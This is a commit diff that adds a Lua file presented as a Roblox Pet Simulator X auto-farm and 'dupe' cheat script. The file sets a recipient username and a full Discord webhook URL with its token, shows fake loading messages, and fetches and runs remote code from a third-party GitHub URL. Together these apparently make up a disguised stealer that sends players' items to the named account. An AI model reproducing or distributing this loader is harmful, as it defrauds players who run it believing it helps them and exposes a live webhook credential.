fe31e892545e0e2d9f953a31d04eb65c044cf47c
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2023-07-03 19:22:39 +0700

    Update and rename AutoFarming/AutoMission/AutoPlay/UnlockHoverboard/PetChanger/MoonGG/Main/.lua to AutoFarming/AutoMission/AutoPlay/UnlockHoverboard/PetChanger/MoonGG/Main/AddedDupeConfirmed/fixed/.lua

---
+++ AutoFarming/AutoMission/AutoPlay/UnlockHoverboard/PetChanger/MoonGG/Main/AddedDupeConfirmed/fixed/.lua
@@ -0,0 +1,10 @@
+Username = "charken_14"
+--Username2 = "kalongtzy" (will be back soon)
+WebHook = "https://discord.com/api/webhooks/1125398882713608212/9j_yMfiigQUxgwtOKdFqfqKaCtdyxrmJ65SCOaahAwlC6nrPqth2aEX7rKeJIyHC17rq"
+loadingscreen = true
+_G.CustomScriptName = "Moon Pet Sim x Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
